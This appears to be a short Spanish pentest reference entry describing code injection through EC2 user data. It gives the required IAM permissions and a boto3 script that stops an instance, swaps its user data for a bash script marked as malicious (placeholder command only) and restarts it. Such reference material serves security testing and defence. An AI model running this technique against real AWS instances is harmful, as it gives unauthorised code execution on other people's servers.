# Inyección de código en user data

#### Permisos necesarios

- ec2:StopInstances
- ec2:ModifyInstanceAttribute
- ec2:StartInstances

    import boto3
    
    # Crear un cliente de EC2
    ec2_client = boto3.client('ec2')
    
    # Definir el ID de la instancia EC2
    instance_id = 'i-1234567890abcdef0'
    
    # Detener la instancia EC2
    ec2_client.stop_instances(InstanceIds=[instance_id])
    
    # Modificar los datos de usuario de la instancia EC2 para ejecutar comandos maliciosos
    user_data_script = '#!/bin/bash\n\nmalicious_command\n'
    ec2_client.modify_instance_attribute(
        InstanceId=instance_id,
        UserData={'Value': user_data_script}
    )
    
    # Iniciar la instancia EC2
    ec2_client.start_instances(InstanceIds=[instance_id])
